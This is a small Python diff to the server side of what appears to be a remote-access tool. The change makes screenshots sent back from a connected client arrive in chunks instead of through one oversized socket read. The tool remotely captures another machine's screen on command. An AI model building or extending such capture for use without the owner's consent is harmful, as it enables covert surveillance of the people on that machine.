@@ -72,14 +72,21 @@ class SERVER:
         client.send(message.encode())
         print('Message Sent!')
     
+    
     def screenshot(self):
         client.send(command.encode())
-        file = client.recv(2147483647)
+        BUFF_SIZE = 4096
+        data = bytearray()
+        while True:
+            packet = client.recv(BUFF_SIZE)
+            if not packet:
+                break
+            data.extend(packet)
         dt = datetime.now()
         ts = datetime.timestamp(dt)
         filename = 'screenshot' + str(ts) + '.png'
         with open(filename, 'wb') as open_file:
-            open_file.write(file)
+            open_file.write(data)
             open_file.close()
             self.progressbar()
         print("Screenshot Downloaded!")
